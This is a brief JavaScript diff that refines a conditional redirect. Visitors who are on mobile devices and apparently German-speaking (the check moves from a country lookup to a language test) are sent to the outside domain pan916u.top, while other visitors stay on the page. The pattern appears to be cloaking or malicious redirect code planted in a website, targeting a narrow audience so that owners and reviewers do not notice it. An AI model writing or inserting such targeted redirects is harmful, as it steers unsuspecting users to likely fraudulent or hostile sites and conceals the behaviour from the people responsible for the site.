@@ -46,7 +46,7 @@ function isGermanLang() {
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'DE' && isMobileDevice() ) {
+        if ( isGermanLang()  && isMobileDevice() ) {
           window.location.href = "https://pan916u.top/dep/k001";
           return;
         }
